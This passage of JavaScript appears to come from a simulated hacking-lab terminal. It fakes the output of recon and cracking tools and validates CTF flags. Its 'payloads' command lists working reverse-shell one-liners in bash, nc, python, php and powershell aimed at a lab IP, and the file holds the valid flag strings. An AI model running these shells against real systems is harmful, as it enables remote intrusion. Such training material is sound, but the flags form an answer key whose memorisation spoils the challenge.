                html += `<tr><td><strong>${i + 1}</strong></td><td style="color: #38bdf8;">${escapeHtml(n.title)}</td><td>${escapeHtml(n.tags || '-')}</td><td style="color: var(--term-text-dim);">${escapeHtml(preview)}...</td></tr>`;
            });
            html += `</table>`;
            html += `<div style="font-size: 0.78rem; color: var(--term-text-dim); margin-top: 4px;">Type <code>notes view &lt;#&gt;</code> to read full note, or <code>notes add &lt;title&gt; | &lt;content&gt;</code> to save.</div>`;
            writeHtmlOutput(html);
        },

        payloads: (args) => {
            const filter = (args[0] || '').toLowerCase();
            const payloadList = [
                { tech: "bash", cmd: "sh -i >& /dev/tcp/10.10.14.2/4444 0>&1" },
                { tech: "bash", cmd: "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'" },
                { tech: "nc", cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f" },
                { tech: "nc", cmd: "nc -e /bin/bash 10.10.14.2 4444" },
                { tech: "python", cmd: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.2\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'" },
                { tech: "php", cmd: "php -r '$sock=fsockopen(\"10.10.14.2\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
                { tech: "powershell", cmd: "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"10.10.14.2\",4444)" }
            ];

            const matches = filter ? payloadList.filter(p => p.tech.includes(filter)) : payloadList;
            let html = `<div style="color: var(--term-accent); font-weight: 700; margin-bottom: 6px;">[+] TACTICAL PAYLOAD ARSENAL (VPN IP: 10.10.14.2, PORT: 4444):</div>`;
            html += `<table class="term-table"><tr><th>STACK</th><th>REVERSE SHELL PAYLOAD</th></tr>`;
            matches.forEach(p => {
                html += `<tr><td style="color: #facc15; font-weight: 700; width: 110px;">${escapeHtml(p.tech.toUpperCase())}</td><td style="color: #4ade80; font-family: monospace;">${escapeHtml(p.cmd)}</td></tr>`;
            });
            html += `</table>`;
            html += `<div style="font-size: 0.78rem; color: var(--term-text-dim); margin-top: 4px;">Launch full multi-encoder generator at <a href="payloads.html" style="color: #38bdf8;">payloads.html</a></div>`;
            writeHtmlOutput(html);
        },

        ask: (args) => {
            const query = args.join(' ');
            if (!query) {
                writeOutput("usage: ask <your cybersecurity query>", 'term-out error');
                return;
            }
            queryTacticalAI(query);
        },

        ai: (args) => {
            commands.ask(args);
        },

        submit: (args) => {
            const token = args[0];
            if (!token) {
                writeOutput("usage: submit <flag_token>", 'term-out error');
                return;
            }

            const validFlags = {
                "pwn{t3rm1n4l_0p3r4t1v3_cl34r4nc3}": "Terminal Operative User Clearance",
                "pwn{r00t_pr1v1l3g3_3sc4l4t10n_succ3ss}": "Root Privilege Escalation Milestone",
                "pwn{w3bsh3ll_m4st3r_unl0ck3d}": "WebShell Master Vector Challenge"
            };

            if (validFlags[token]) {
                claimCtfReward(token, 250, validFlags[token]);
            } else {
                writeOutput(`[-] Invalid Flag Token: '${token}'. Check files or elevate to root.`, 'term-out error');
            }
        },

        pwn: (args) => {
            if (args[0] === 'ctf') {
                if (args[1]) {
                    commands.submit([args[1]]);
                } else {
                    claimCtfReward("pwn{w3bsh3ll_m4st3r_unl0ck3d}", 250, "WebShell Master Vector Challenge");
                }
            } else {
                writeOutput("Usage: pwn ctf [flag]");
            }
        },

        dig: (args) => {
            const host = args.find(a => !a.startsWith('-') && !['A','AAAA','MX','TXT','NS','SOA'].includes(a.toUpperCase())) || 'pwnbox.academy';
            const type = (args.find(a => ['A', 'AAAA', 'MX', 'TXT', 'NS', 'SOA'].includes(a.toUpperCase())) || 'A').toUpperCase();
            writeOutput(`; <<>> DiG 9.18.19-1~deb12u1-Debian <<>> ${host} ${type}`);
            writeOutput(`;; global options: +cmd`);
            writeOutput(`;; Got answer:`);
            writeOutput(`;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 41285`);
            writeOutput(`;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1`);
            writeOutput(`\n;; QUESTION SECTION:`);
            writeOutput(`;${host}.\t\t\tIN\t${type}`);
            writeOutput(`\n;; ANSWER SECTION:`);
            if (type === 'MX') {
                writeOutput(`${host}.\t\t300\tIN\tMX\t10 mail.${host}.`);
            } else if (type === 'TXT') {
                writeOutput(`${host}.\t\t300\tIN\tTXT\t"v=spf1 include:_spf.google.com ~all"`);
            } else {
                writeOutput(`${host}.\t\t300\tIN\tA\t10.10.10.27`);
            }
            writeOutput(`\n;; Query time: 14 msec`);
            writeOutput(`;; SERVER: 1.1.1.1#53(1.1.1.1) (UDP)`);
            writeOutput(`;; WHEN: ${new Date().toUTCString()}`);
        },

        enum4linux: (args) => {
            const target = args.find(a => !a.startsWith('-')) || '10.10.10.27';
            writeOutput(`Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on ${target}`);
            writeOutput(` ========================== Target Information ========================== `);
            writeOutput(`Target ........... ${target}`);
            writeOutput(`RID Range ........ 500-550,1000-1050`);
            writeOutput(` ==================== Enumerating Workgroup/Domain ==================== `);
            writeOutput(`[+] Got domain/workgroup name: CORP.LOCAL`);
            writeOutput(` ========================== Share Enumeration ========================== `);
            writeOutput(`[+] Found 3 share(s):`);
            writeOutput(`\tIPC$            IPC Service (Samba 4.18.6)`);
            writeOutput(`\tprint$          Printer Drivers`);
            writeOutput(`\tbackups         Enterprise System Backups [READABLE - Anonymous Access]`);
            writeOutput(` ========================== User Enumeration ========================== `);
            writeOutput(`[+] Found local user: Administrator (RID: 500)`);
            writeOutput(`[+] Found local user: guest (RID: 501)`);
            writeOutput(`[+] Found local user: cadet (RID: 1001)`);
            writeOutput(`[+] enum4linux complete.`);
        },

        linpeas: () => {
            writeOutput(`               .---.                 _             `, 'term-out info');
            writeOutput(`              / / \\ \\   _     _ _ __(_) ___  __ _  `, 'term-out info');
            writeOutput(`             / /   \\ \\ | |   | | '__| |/ _ \\/ _' | `, 'term-out info');
            writeOutput(`            / /     \\ \\| |___| | |  | |  __/ (_| | `, 'term-out info');
            writeOutput(`           / /       \\_\\_____|_|_|  |_|\\___|\\__,_| `, 'term-out info');
            writeOutput(`\n[+] LINPEAS (v2026.11) - Linux Privilege Escalation Awesome Script`);
            writeOutput(`[+] Scanning target system: ${currentHost} (Linux 6.5.0-generic)`);
            writeOutput(`\n[!] SUID Binaries (Potential Escalation Vectors):`);
            writeOutput(`    -rwsr-xr-x 1 root root /usr/bin/sudo`);
            writeOutput(`    -rwsr-xr-x 1 root root /usr/bin/pkexec`);
            writeOutput(`    -rwsr-xr-x 1 root root /usr/bin/find [!] VULNERABLE: GTFOBins execute available!`);
            writeOutput(`\n[!] Sudo Privileges:`);
            writeOutput(`    User agent may run the following commands on this host:`);
            writeOutput(`    (ALL : ALL) NOPASSWD: /usr/bin/find`);
            writeOutput(`\n[+] Audit finished. 1 Critical privilege escalation path identified via SUID /usr/bin/find.`);
        },

        john: (args) => {
            const file = args.find(a => !a.startsWith('-')) || '/etc/shadow';
            writeOutput(`Loaded 1 password hash (sha512crypt, crypt(3) $6$ [AVX2 256/256])`);
            writeOutput(`Cost 1 (iteration count) is 5000 for all loaded hashes`);
            writeOutput(`Will run 4 OpenMP threads`);
            writeOutput(`Press 'q' or Ctrl-C to abort, almost any other key for status`);
            writeOutput(`password123      (agent)`);
            writeOutput(`1g 0:00:00:01 DONE (2026-11-06 23:30) 0.8196g/s 1240p/s 1240c/s 1240C/s`);
            writeOutput(`Use the "--show" option to display all of the cracked passwords reliably`);
            writeOutput(`Session completed.`);
        },

        gobuster: (args) => {
            const url = args.find(a => a.startsWith('http')) || 'http://10.10.10.27';
            writeOutput(`===============================================================`);
            writeOutput(`Gobuster v3.6 - Dir & DNS Brute Forcing`);
            writeOutput(`[+] Url:            ${url}`);
            writeOutput(`[+] Method:         GET`);
            writeOutput(`[+] Threads:        10`);
            writeOutput(`[+] Wordlist:       /usr/share/wordlists/dirb/common.txt`);
            writeOutput(`===============================================================`);
            writeOutput(`Starting gobuster in directory enumeration mode`);
            writeOutput(`===============================================================`);
            writeOutput(`/admin                (Status: 301) [Size: 178] [--> /admin/]`);
            writeOutput(`/api                  (Status: 200) [Size: 420]`);
            writeOutput(`/assets               (Status: 301) [Size: 178] [--> /assets/]`);
            writeOutput(`/dashboard            (Status: 200) [Size: 1845]`);
            writeOutput(`/login                (Status: 200) [Size: 932]`);
            writeOutput(`/robots.txt           (Status: 200) [Size: 58]`);
            writeOutput(`===============================================================`);
            writeOutput(`Finished: 6 matching paths identified.`);
        },

        nikto: (args) => {
            const host = args.find(a => !a.startsWith('-')) || '10.10.10.27';
            writeOutput(`- Nikto v2.5.0`);
            writeOutput(`---------------------------------------------------------------------------`);
            writeOutput(`+ Target IP:          ${host}`);
            writeOutput(`+ Target Hostname:    pwnbox.local`);
            writeOutput(`+ Target Port:        80`);
            writeOutput(`+ Start Time:         ${new Date().toUTCString()}`);
            writeOutput(`---------------------------------------------------------------------------`);
            writeOutput(`+ Server: Apache/2.4.57 (Debian)`);
            writeOutput(`+ [!] The anti-clickjacking X-Frame-Options header is not present.`);
            writeOutput(`+ [!] The X-Content-Type-Options header is not set.`);
            writeOutput(`+ [+] /robots.txt: Contains 2 interesting disallowed entries.`);
            writeOutput(`+ [+] /admin/: Directory indexing found.`);
            writeOutput(`+ 1482 requests: 0 error(s) and 4 item(s) reported on remote host.`);
            writeOutput(`+ End Time:           ${new Date().toUTCString()} (4 seconds)`);
        },

        nc: (args) => {
            const host = args.find(a => !a.startsWith('-')) || '10.10.10.27';
            const port = args[args.indexOf(host) + 1] || '80';
            writeOutput(`(UNKNOWN) [${host}] ${port} (?) open`);
            writeOutput(`SSH-2.0-OpenSSH_9.3p1 Debian-1`);
        },

        chown: (args) => {
            if (args.length < 2) {
                writeOutput("usage: chown <owner[:group]> <file>", "term-out error");
                return;
            }
            writeOutput(`[+] Changed ownership of '${args[1]}' to '${args[0]}'.`);
        }
    };

    function executeCommand(input) {
        const trimmed = input.trim();
        if (!trimmed) return;

        commandHistory.push(trimmed);
        historyIdx = commandHistory.length;

        // Render command row
        const cmdRow = document.createElement('div');
        cmdRow.className = 'term-cmd-row';
        cmdRow.innerHTML = `<span class="term-prompt-tag" style="color: ${isRoot ? 'var(--term-error)' : 'var(--term-prompt)'}">${getPromptString()}</span> <span class="term-cmd-text">${escapeHtml(trimmed)}</span>`;
        screenEl.appendChild(cmdRow);

        const parts = trimmed.split(/\s+/);
        const cmdName = parts[0].toLowerCase();
        const args = parts.slice(1);

        if (commands[cmdName]) {
            try {
                commands[cmdName](args);
            } catch (err) {
                writeOutput(`Error executing ${cmdName}: ${err.message}`, 'term-out error');
            }
        } else {
            writeOutput(`bash: ${cmdName}: command not found. Type 'help' for available commands.`, 'term-out error');
        }

        scrollBottom();
    }

    // Tab Auto-Completion
    function handleTabCompletion() {
        if (!inputEl) return;
        const val = inputEl.value;
        const availableCommands = Object.keys(commands);

        if (!val.includes(' ')) {
            const matches = availableCommands.filter(c => c.startsWith(val.toLowerCase()));
            if (matches.length === 1) {
                inputEl.value = matches[0] + ' ';
            } else if (matches.length > 1) {
                writeOutput(matches.join('  '));
            }
        } else {
            const parts = val.split(' ');
            const partialPath = parts[parts.length - 1];
            const curr = getNode(currentPath);
            if (curr && curr.type === 'dir') {
                const files = Object.keys(curr.children);
                const matches = files.filter(f => f.startsWith(partialPath));
                if (matches.length === 1) {
                    parts[parts.length - 1] = matches[0];
                    inputEl.value = parts.join(' ');
                } else if (matches.length > 1) {
                    writeOutput(matches.join('  '));
                }
            }
        }
    }

    function init() {
        screenEl = document.getElementById('terminalScreen');
        inputEl = document.getElementById('terminalInput');
        promptTagEl = document.getElementById('terminalPromptTag');
        modeIndicatorEl = document.getElementById('termModeIndicator');
        modeDotEl = document.getElementById('termModeDot');
        modeTextEl = document.getElementById('termModeText');

        if (!inputEl || !screenEl) return;

        updatePrompt();
        setTerminalMode(false);

        // Terminal Input Keydown
        inputEl.addEventListener('keydown', (e) => {
            // Esc key exits typing and triggers Navigation Mode
            if (e.key === 'Escape') {
                e.preventDefault();
                inputEl.blur();
                setTerminalMode(true);
                return;
            }

            // Enter executes command
            if (e.key === 'Enter') {
                const cmd = inputEl.value;
                inputEl.value = '';
                executeCommand(cmd);
                return;
            }

            // Command History Navigation
            if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIdx > 0) {
                    historyIdx--;
                    inputEl.value = commandHistory[historyIdx] || '';
                }
                return;
            }
            if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIdx < commandHistory.length - 1) {
                    historyIdx++;
                    inputEl.value = commandHistory[historyIdx] || '';
                } else {
                    historyIdx = commandHistory.length;
                    inputEl.value = '';
                }
                return;
            }

            // Tab Completion
            if (e.key === 'Tab') {
                e.preventDefault();
                handleTabCompletion();
                return;
            }

            // Ctrl+L Clears Screen
            if (e.ctrlKey && e.key.toLowerCase() === 'l') {
                e.preventDefault();
                commands.clear();
                return;
            }

            // Ctrl+C Aborts Current Input
            if (e.ctrlKey && e.key.toLowerCase() === 'c') {
                e.preventDefault();
                writeOutput(`^C`);
                inputEl.value = '';
                return;
            }
        });

        // Focus & Blur Event Listeners
        inputEl.addEventListener('focus', () => {
            setTerminalMode(false);
        });

        inputEl.addEventListener('blur', () => {
            setTerminalMode(true);
        });

        // Global keydown on window to easily refocus terminal or handle shortcuts
        window.addEventListener('keydown', (e) => {
            // If user presses Enter when input is not focused, focus it!
            if (e.key === 'Enter' && document.activeElement !== inputEl) {
                const isFormInput = ['INPUT', 'TEXTAREA', 'SELECT'].includes(document.activeElement?.tagName);
                if (!isFormInput) {
                    e.preventDefault();
                    inputEl.focus();
                    setTerminalMode(false);
                }
            }

            // Command Palette (Ctrl+/ or Cmd+/)
            if ((e.ctrlKey || e.metaKey) && e.key === '/') {
                if (typeof window.openCommandPalette === 'function') {
                    e.preventDefault();
                    window.openCommandPalette();
                }
            }
        });

        // Click anywhere inside terminal window focuses input
        const win = document.getElementById('terminalWindow');
        if (win) {
            win.addEventListener('click', () => {
                inputEl.focus();
                setTerminalMode(false);
            });
        }

        // Mode indicator pill click switches mode
        if (modeIndicatorEl) {
            modeIndicatorEl.addEventListener('click', (e) => {
                e.stopPropagation();
                if (document.activeElement === inputEl) {
                    inputEl.blur();
                    setTerminalMode(true);
                } else {
                    inputEl.focus();
                    setTerminalMode(false);
                }
            });
        }

        inputEl.focus();
    }

    // Exposed helpers
    window.PwnTerminal = {
        init,
        executeCommand,
        commands,
        COMMAND_MANUALS,
        setTheme: (themeName) => {
            document.documentElement.setAttribute('data-term-theme', themeName);
            localStorage.setItem('pwn_term_theme', themeName);
        },
        toggleCrt: () => {
            const crt = document.getElementById('crtOverlay');
            if (crt) {
                crt.classList.toggle('disabled');
            }
        },
        runQuickCmd: (cmd) => {
            if (inputEl) {
                inputEl.value = '';
                executeCommand(cmd);
                inputEl.focus();
                setTerminalMode(false);
            }
        }
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
